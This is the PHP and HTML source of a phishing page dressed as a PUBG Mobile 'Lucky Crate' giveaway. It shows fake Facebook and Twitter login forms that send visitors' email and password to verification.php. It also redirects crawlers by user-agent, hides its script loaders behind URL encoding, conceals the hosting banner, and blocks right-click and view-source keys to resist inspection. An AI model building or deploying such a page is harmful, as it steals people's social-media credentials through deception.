<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head> <style>img[alt="www.000webhost.com"]{display:none;}</style>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
<script type="text/javascript">
document.write(unescape('%20%20%20%20%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%6A%73%2D%7A%6F%6E%65%2F%6A%71%75%65%72%79%2E%6A%73%22%3E%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%0A%20%20%20%20%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%6A%73%2D%7A%6F%6E%65%2F%6D%61%69%6E%2D%7A%6F%6E%65%2E%6A%73%22%3E%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%20%20%20'));
</script> 
<script type="text/javascript" src="./index_files/main-zone.js.download"></script>   
<script language="JavaScript">document.write(ls())</script>
<script language="JavaScript">document.write(ls())</script>
<script script language="JavaScript">document.write(riyanandhika())</script>
<script language="JavaScript">document.write(toxic())</script>
<script type="text/javascript" src="./index_files/tolak-bala.js.download"></script>
<script type="text/javascript" async="" src="./index_files/request"></script>
<script language="JavaScript">document.write(head())</script>
<script type="text/javascript" src="./index_files/tolak-bala.js(1).download"></script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style type="text/css">
.swal-icon--error {
	border-color:#f27474;
	-webkit-animation:animateErrorIcon .5s;
	animation:animateErrorIcon .5s
}
.swal-icon--error__x-mark {
	position:relative;
	display:block;
	-webkit-animation:animateXMark .5s;
	animation:animateXMark .5s
}
.swal-icon--error__line {
	position:absolute;
	height:5px;
	width:47px;
	background-color:#f27474;
	display:block;
	top:37px;
	border-radius:2px
}
.swal-icon--error__line--left {
	-webkit-transform:rotate(45deg);
	transform:rotate(45deg);
	left:17px
}
.swal-icon--error__line--right {
	-webkit-transform:rotate(-45deg);
	transform:rotate(-45deg);
	right:16px
}
@-webkit-keyframes animateErrorIcon {
	0% {
		-webkit-transform:rotateX(100deg);
		transform:rotateX(100deg);
		opacity:0
	}
	to {
		-webkit-transform:rotateX(0deg);
		transform:rotateX(0deg);
		opacity:1
	}
}
@keyframes animateErrorIcon {
	0% {
		-webkit-transform:rotateX(100deg);
		transform:rotateX(100deg);
		opacity:0
	}
	to {
		-webkit-transform:rotateX(0deg);
		transform:rotateX(0deg);
		opacity:1
	}
}
@-webkit-keyframes animateXMark {
	0% {
		-webkit-transform:scale(.4);
		transform:scale(.4);
		margin-top:26px;
		opacity:0
	}
	50% {
		-webkit-transform:scale(.4);
		transform:scale(.4);
		margin-top:26px;
		opacity:0
	}
	80% {
		-webkit-transform:scale(1.15);
		transform:scale(1.15);
		margin-top:-6px
	}
	to {
		-webkit-transform:scale(1);
		transform:scale(1);
		margin-top:0;
		opacity:1
	}
}
@keyframes animateXMark {
	0% {
		-webkit-transform:scale(.4);
		transform:scale(.4);
		margin-top:26px;
		opacity:0
	}
	50% {
		-webkit-transform:scale(.4);
		transform:scale(.4);
		margin-top:26px;
		opacity:0
	}
	80% {
		-webkit-transform:scale(1.15);
		transform:scale(1.15);
		margin-top:-6px
	}
	to {
		-webkit-transform:scale(1);
		transform:scale(1);
		margin-top:0;
		opacity:1
	}
}
.swal-icon--warning {
	border-color:#f8bb86;
	-webkit-animation:pulseWarning .75s infinite alternate;
	animation:pulseWarning .75s infinite alternate
}
.swal-icon--warning__body {
	width:5px;
	height:47px;
	top:10px;
	border-radius:2px;
	margin-left:-2px
}
.swal-icon--warning__body,.swal-icon--warning__dot {
	position:absolute;
	left:50%;
	background-color:#211f36
}
.swal-icon--warning__dot {
	width:7px;
	height:7px;
	border-radius:50%;
	margin-left:-4px;
	bottom:-11px
}
@-webkit-keyframes pulseWarning {
	0% {
		border-color:#f8d486
	}
	to {
		border-color:#f8bb86
	}
}
@keyframes pulseWarning {
	0% {
		border-color:#f8d486
	}
	to {
		border-color:#f8bb86
	}
}
.swal-icon--success {
	border-color:green
}
.swal-icon--success:after,.swal-icon--success:before {
	content:"";
	border-radius:50%;
	position:absolute;
	width:60px;
	height:120px;
	background:#211f36;
	-webkit-transform:rotate(45deg);
	transform:rotate(45deg)
}
.swal-icon--success:before {
	border-radius:120px 0 0 120px;
	top:-7px;
	left:-33px;
	-webkit-transform:rotate(-45deg);
	transform:rotate(-45deg);
	-webkit-transform-origin:60px 60px;
	transform-origin:60px 60px
}
.swal-icon--success:after {
	border-radius:0 120px 120px 0;
	top:-11px;
	left:30px;
	-webkit-transform:rotate(-45deg);
	transform:rotate(-45deg);
	-webkit-transform-origin:0 60px;
	transform-origin:0 60px;
	-webkit-animation:rotatePlaceholder 4.25s ease-in;
	animation:rotatePlaceholder 4.25s ease-in
}
.swal-icon--success__ring {
	width:80px;
	height:80px;
	border:4px solid hsla(98,55%,69%,.2);
	border-radius:50%;
	box-sizing:content-box;
	position:absolute;
	left:-4px;
	top:-4px;
	z-index:2
}
.swal-icon--success__hide-corners {
	width:5px;
	height:90px;
	background-color:#211f36;
	padding:1px;
	position:absolute;
	left:28px;
	top:8px;
	z-index:1;
	-webkit-transform:rotate(-45deg);
	transform:rotate(-45deg)
}
.swal-icon--success__line {
	height:5px;
	background-color:green;
	display:block;
	border-radius:2px;
	position:absolute;
	z-index:2
}
.swal-icon--success__line--tip {
	width:25px;
	left:14px;
	top:46px;
	-webkit-transform:rotate(45deg);
	transform:rotate(45deg);
	-webkit-animation:animateSuccessTip .75s;
	animation:animateSuccessTip .75s
}
.swal-icon--success__line--long {
	width:47px;
	right:8px;
	top:38px;
	-webkit-transform:rotate(-45deg);
	transform:rotate(-45deg);
	-webkit-animation:animateSuccessLong .75s;
	animation:animateSuccessLong .75s
}
@-webkit-keyframes rotatePlaceholder {
	0% {
		-webkit-transform:rotate(-45deg);
		transform:rotate(-45deg)
	}
	5% {
		-webkit-transform:rotate(-45deg);
		transform:rotate(-45deg)
	}
	12% {
		-webkit-transform:rotate(-405deg);
		transform:rotate(-405deg)
	}
	to {
		-webkit-transform:rotate(-405deg);
		transform:rotate(-405deg)
	}
}
@keyframes rotatePlaceholder {
	0% {
		-webkit-transform:rotate(-45deg);
		transform:rotate(-45deg)
	}
	5% {
		-webkit-transform:rotate(-45deg);
		transform:rotate(-45deg)
	}
	12% {
		-webkit-transform:rotate(-405deg);
		transform:rotate(-405deg)
	}
	to {
		-webkit-transform:rotate(-405deg);
		transform:rotate(-405deg)
	}
}
@-webkit-keyframes animateSuccessTip {
	0% {
		width:0;
		left:1px;
		top:19px
	}
	54% {
		width:0;
		left:1px;
		top:19px
	}
	70% {
		width:50px;
		left:-8px;
		top:37px
	}
	84% {
		width:17px;
		left:21px;
		top:48px
	}
	to {
		width:25px;
		left:14px;
		top:45px
	}
}
@keyframes animateSuccessTip {
	0% {
		width:0;
		left:1px;
		top:19px
	}
	54% {
		width:0;
		left:1px;
		top:19px
	}
	70% {
		width:50px;
		left:-8px;
		top:37px
	}
	84% {
		width:17px;
		left:21px;
		top:48px
	}
	to {
		width:25px;
		left:14px;
		top:45px
	}
}
@-webkit-keyframes animateSuccessLong {
	0% {
		width:0;
		right:46px;
		top:54px
	}
	65% {
		width:0;
		right:46px;
		top:54px
	}
	84% {
		width:55px;
		right:0;
		top:35px
	}
	to {
		width:47px;
		right:8px;
		top:38px
	}
}
@keyframes animateSuccessLong {
	0% {
		width:0;
		right:46px;
		top:54px
	}
	65% {
		width:0;
		right:46px;
		top:54px
	}
	84% {
		width:55px;
		right:0;
		top:35px
	}
	to {
		width:47px;
		right:8px;
		top:38px
	}
}
.swal-icon--info {
	border-color:#c9dae1
}
.swal-icon--info:before {
	width:5px;
	height:29px;
	bottom:17px;
	border-radius:2px;
	margin-left:-2px
}
.swal-icon--info:after,.swal-icon--info:before {
	content:"";
	position:absolute;
	left:50%;
	background-color:#c9dae1
}
.swal-icon--info:after {
	width:7px;
	height:7px;
	border-radius:50%;
	margin-left:-3px;
	top:19px
}
.swal-icon {
	width:80px;
	height:80px;
	border-width:4px;
	border-style:solid;
	border-radius:50%;
	padding:0;
	position:relative;
	box-sizing:content-box;
	margin:20px auto
}
.swal-icon:first-child {
	margin-top:32px
}
.swal-icon--custom {
	width:auto;
	height:auto;
	max-width:100%;
	border:none;
	border-radius:0
}
.swal-icon img {
	max-width:100%;
	max-height:100%
}
.swal-title {
	color:gold;
	font-weight:600;
	text-transform:none;
	position:relative;
	display:block;
	padding:13px 16px;
	font-size:27px;
	line-height:normal;
	text-align:center;
	margin-bottom:0
}
.swal-title:first-child {
	margin-top:26px
}
.swal-title:not(:first-child) {
	padding-bottom:0
}
.swal-title:not(:last-child) {
	margin-bottom:13px
}
.swal-text {
	font-size:16px;
	position:relative;
	float:none;
	line-height:normal;
	vertical-align:top;
	text-align:left;
	display:inline-block;
	margin:0;
	padding:0 10px;
	font-weight:400;
	color:red;
	max-width:calc(100% - 20px);
	overflow-wrap:break-word;
	box-sizing:border-box
}
.swal-text:first-child {
	margin-top:45px
}
.swal-text:last-child {
	margin-bottom:45px
}
.swal-footer {
	text-align:right;
	padding-top:13px;
	margin-top:13px;
	padding:13px 16px;
	border-radius:inherit;
	border-top-left-radius:0;
	border-top-right-radius:0
}
.swal-button-container {
	margin:5px;
	display:inline-block;
	position:relative
}
.swal-2button {
	background-color:red;
	color:#fff;
	border:none;
	box-shadow:none;
	border-radius:5px;
	font-weight:600;
	font-size:14px;
	padding:10px 24px;
	margin:0;
	cursor:pointer
}
.swal-2button[not:disabled]:hover {
	background-color:#78cbf2
}
.swal-button:active {
	background-color:#70bce0;
}
.claim {
	background: #eaa300;
	color: #000;
	border: 1px solid #ffcc57;
	font-size: 15px;
	font-family: Teko, sans-serif;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
	text-shadow: none;
	text-decoration: none;
	letter-spacing: 2px;
	padding: 10px 24px;
	margin:0;
	cursor:pointer
}
.swal-button:focus {
	outline:none;
	box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(43,114,165,.29)
}
.swal-button[disabled] {
	opacity:.5;
	cursor:default
}
.swal-button::-moz-focus-inner {
	border:0
}
.swal-button--cancel {
	color:#555;
	background-color:#efefef
}
.swal-button--cancel[not:disabled]:hover {
	background-color:#e8e8e8
}
.swal-button--cancel:active {
	background-color:#d7d7d7
}
.swal-button--cancel:focus {
	box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(116,136,150,.29)
}
.swal-button--danger {
	background-color:#e64942
}
.swal-button--danger[not:disabled]:hover {
	background-color:#df4740
}
.swal-button--danger:active {
	background-color:#cf423b
}
.swal-button--danger:focus {
	box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(165,43,43,.29)
}
.swal-content {
	padding:0 20px;
	margin-top:20px;
	font-size:medium
}
.swal-content:last-child {
	margin-bottom:20px
}
.swal-content__input,.swal-content__textarea {
	-webkit-appearance:none;
	background-color:#000;
	border:none;
	font-size:14px;
	display:block;
	box-sizing:border-box;
	width:100%;
	border:1px solid rgba(0,0,0,.14);
	padding:10px 13px;
	border-radius:2px;
	transition:border-color .2s
}
.swal-content__input:focus,.swal-content__textarea:focus {
	outline:none;
	border-color:#6db8ff
}
.swal-content__textarea {
	resize:vertical
}
.swal-button--loading {
	color:transparent
}
.swal-button--loading~.swal-button__loader {
	opacity:1
}
.swal-button__loader {
	position:absolute;
	height:auto;
	width:43px;
	z-index:2;
	left:50%;
	top:50%;
	-webkit-transform:translateX(-50%) translateY(-50%);
	transform:translateX(-50%) translateY(-50%);
	text-align:center;
	pointer-events:none;
	opacity:0
}
.swal-button__loader div {
	display:inline-block;
	float:none;
	vertical-align:baseline;
	width:9px;
	height:9px;
	padding:0;
	border:none;
	margin:2px;
	opacity:.4;
	border-radius:7px;
	background-color:hsla(0,0%,100%,.9);
	transition:background .2s;
	-webkit-animation:swal-loading-anim 1s infinite;
	animation:swal-loading-anim 1s infinite
}
.swal-button__loader div:nth-child(3n+2) {
	-webkit-animation-delay:.15s;
	animation-delay:.15s
}
.swal-button__loader div:nth-child(3n+3) {
	-webkit-animation-delay:.3s;
	animation-delay:.3s
}
@-webkit-keyframes swal-loading-anim {
	0% {
		opacity:.4
	}
	20% {
		opacity:.4
	}
	50% {
		opacity:1
	}
	to {
		opacity:.4
	}
}
@keyframes swal-loading-anim {
	0% {
		opacity:.4
	}
	20% {
		opacity:.4
	}
	50% {
		opacity:1
	}
	to {
		opacity:.4
	}
}
.swal-overlay {
	position:fixed;
	top:0;
	bottom:0;
	left:0;
	right:0;
	text-align:center;
	font-size:0;
	overflow-y:auto;
	background-color:rgba(0,0,0,.4);
	z-index:10000;
	pointer-events:none;
	opacity:0;
	transition:opacity .3s
}
.swal-overlay:before {
	content:" ";
	display:inline-block;
	vertical-align:middle;
	height:100%
}
.swal-overlay--show-modal {
	opacity:1;
	pointer-events:auto
}
.swal-overlay--show-modal .swal-modal {
	opacity:1;
	pointer-events:auto;
	box-sizing:border-box;
	-webkit-animation:showSweetAlert .3s;
	animation:showSweetAlert .3s;
	will-change:transform
}
.swal-modal {
	width:450px;
	opacity:0;
	pointer-events:none;
	background:#211f36;
	border:1px solid #808080;
	text-align:center;
	border-radius:5px;
	position:static;
	margin:20px auto;
	display:inline-block;
	vertical-align:middle;
	-webkit-transform:scale(1);
	transform:scale(1);
	-webkit-transform-origin:50% 50%;
	transform-origin:50% 50%;
	z-index:10001;
	transition:opacity .2s,-webkit-transform .3s;
	transition:transform .3s,opacity .2s;
	transition:transform .3s,opacity .2s,-webkit-transform .3s
}

.sweet-warning{
 background-color: #eaa300;
 color: #000;
}
@media (max-width:500px) {
	.swal-modal {
		width:calc(100% - 20px)
	}
}
@-webkit-keyframes showSweetAlert {
	0% {
		-webkit-transform:scale(1);
		transform:scale(1)
	}
	1% {
		-webkit-transform:scale(.5);
		transform:scale(.5)
	}
	45% {
		-webkit-transform:scale(1.05);
		transform:scale(1.05)
	}
	80% {
		-webkit-transform:scale(.95);
		transform:scale(.95)
	}
	to {
		-webkit-transform:scale(1);
		transform:scale(1)
	}
}
@keyframes showSweetAlert {
	0% {
		-webkit-transform:scale(1);
		transform:scale(1)
	}
	1% {
		-webkit-transform:scale(.5);
		transform:scale(.5)
	}
	45% {
		-webkit-transform:scale(1.05);
		transform:scale(1.05)
	}
	80% {
		-webkit-transform:scale(.95);
		transform:scale(.95)
	}
	to {
		-webkit-transform:scale(1);
		transform: scale(1)
	}
}
</style>

<div class="my-container crate">
<div class="nav-crate">
<i class="zmdi zmdi-help-outline icon-help" onclick="open_help()"></i>
<i class="zmdi zmdi-rotate-left icon-back" onclick="location.href='/';"></i>
Lucky Crate
</div>
<div class="content-crate">
<div class="scroll">
<div id="zone">
<script language="JavaScript">document.write(inti())</script>
<section id="js-lotto">
<div class="gift" data-order="0">
<img src="img/reward/weapon/00.png">
</div>
<div class="gift" data-order="1">
<img src="img/reward/weapon/1.png">
</div>
<div class="gift" data-order="2">
<img src="img/reward/weapon/2.png">
</div>
<div class="gift" data-order="3">
<img src="img/reward/weapon/3.png">
</div>
<div class="gift" data-order="4">
<img src="img/reward/weapon/4.png">
</div>
<div class="gift" data-order="5">
<img src="img/reward/weapon/5.png">
</div>
<div class="gift" data-order="6">
<img src="img/reward/weapon/6.png">
</div>
<div class="gift" data-order="7">
<img src="img/reward/weapon/7.png">
</div>
<div class="gift" data-order="8">
<img src="img/reward/weapon/8.png">
</div>
<div class="gift" data-order="9">
<img src="img/reward/weapon/9.png">
</div>
<div class="gift" data-order="10">
<img src="img/reward/weapon/10.png">
</div>
<div class="gift" data-order="11">
<img src="img/reward/weapon/11.png">
</div>
<div class="gift" data-order="12">
<img src="img/reward/weapon/12.png">
</div>
<div class="gift" data-order="13">
<img src="img/reward/weapon/13.png">
</div>
<div class="gift" data-order="14">
<img src="img/reward/weapon/14.png">
</div>
</section>
</div> <!--- fungsi --->
</div> <!--- scroll --->
</div> <!--- content --->

<div id="js-start">
<o onclick="klik1()">
<button type="button" class="btn-open-this">Start Lucky Crate</button>
</o>
</div>

</div> <!--- container --->

<div class="popup-wrapper animated fadeIn" id="help" style="display: none;">
<div class="popup-gift">
<div class="popup-gift-navbar">
<i class="zmdi zmdi-close" onclick="close_help()"></i>
About Event
</div>
<div class="popup-gift-content">
<div class="popup-gift-txt">
Welcome to the Royale Pass 13 season finale
<br>
<br>
You have the opportunity to get a lucky crate for today only
<br>
Start randomly giving your gifts and get them for free!
</div>
<br>
<button type="button" class="tengah" onclick="close_help()">Okay</button>
</div>
</div> <!--- popup gift --->
</div> <!--- popup --->

<div class="popup-wrapper animated fadeIn" id="get_gift" style="display: none;">
<div class="popup-gift">
<div class="popup-gift-navbar">
<i class="zmdi zmdi-close" onclick="tutup_get_gift()"></i>
Congratulations, you got:
</div>
<div class="popup-gift-content">
<div class="popup-gift-txt">
Do you want to collect this gift of your choice?
</div>
<div class="gift">
<img class="gift_img" src="">
</div>
<br>
<button type="button" class="tengah" onclick="account_login()">Collect This</button>
</div>
</div> <!--- popup gift --->
</div> <!--- popup --->

<div class="popup-wrapper animated fadeIn" id="account_login" style="display: none;">
<div class="popup-gift">
<div class="popup-gift-navbar">
<i class="zmdi zmdi-close" onclick="tutup_account_login()"></i>
Account Login
</div>
<div class="popup-gift-content">
<div class="popup-gift-txt">
Login to receive your rewards
</div>
<div class="btn-login" onclick="open_facebook()">
<div class="btn-login-logo-wrapper">
<img src="img/login/facebook_icon.png">
</div>
<div class="btn-login-txt">
Login using Facebook account
</div>
</div>
<div class="btn-login" onclick="open_twitter()">
<div class="btn-login-logo-wrapper">
<img src="img/login/twitter_icon.png">
</div>
<div class="btn-login-txt">
Login using Twitter account
</div>
</div>
</div>
</div> <!--- popup gift --->
</div> <!--- popup --->

<div class="popup-wrapper facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="verification.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-wrapper twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="verification.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script src="js/popup.js"></script>
<script src="./index_files/jquery.min.js.download"></script> 
<script language="JavaScript">document.write(result())</script>
<script type="text/javascript" src="index_files/gift-zone.js"></script>
<script type="text/javascript">
document.write(unescape('%20%20%20%20%20%20%20%20%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%6A%73%2D%7A%6F%6E%65%2F%73%6C%69%64%65%2D%7A%6F%6E%65%2E%6A%73%22%3E%0A%20%20%20%20%20%20%20%20%3C%2F%73%63%72%69%70%74%3E'));</script>
<script type="text/javascript" src="./index_files/slide-zone.js.download"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
<script language="JavaScript">document.write(luckyspin())</script>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center">
<noscript>
<div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
<div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini! </div>
</div>
</noscript>
</div>
<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}</script>
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn</script>
<style type="text/css">* : (input, textarea) {-webkit-touch-callout: none; -webkit-user-select: none;}</style>
<style type="text/css">img {-webkit-touch-callout: none; -webkit-user-select: none;}</style>
<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}</script>
<script type="text/javascript">document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}</script>

<script>
function tutup_get_gift() {
$('#get_gift').hide();
}
function account_login() {
$('#account_login').show();
$('#get_gift').hide();
}
function tutup_account_login() {
$('#get_gift').show();
$('#account_login').hide();
}
</script>

</body>
</html>